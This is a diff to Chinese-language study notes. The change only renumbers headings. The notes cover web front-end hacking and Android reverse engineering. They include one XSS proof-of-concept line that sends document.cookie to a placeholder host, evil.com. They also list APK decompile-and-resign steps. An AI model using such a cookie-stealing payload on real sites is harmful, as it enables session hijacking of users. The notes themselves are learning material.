@@ -1,9 +1,9 @@
 #  学习笔记
-## Web前端黑客技术揭秘
+## 1. Web前端黑客技术揭秘
 ### POC理解&学习
 1. XSS获取敏感信息：eval(‘new Image().src=“http://www.evil.com/steal.php?c=“+escape(document.cookie)')
 
-## Android逆向学习
+## 2. Android逆向学习
 ### 基础知识
 1. Davlik Android OS的虚拟机，Dalvik基于寄存器，Java VM基于栈，二者明显区别。Davlik专属文件执行格式dex，比Java JVM运行快，内存占用少。
 2. 反编译 Apktool、dex2jar+jd-gui，最终修改APK需要操作.smali文件，然后再使用Apktool将修改的文件打包成APK，再使用 jarsigner进行APK签名：jarsigner -keystore name.keystore Folder keystorealias -keypass passwd
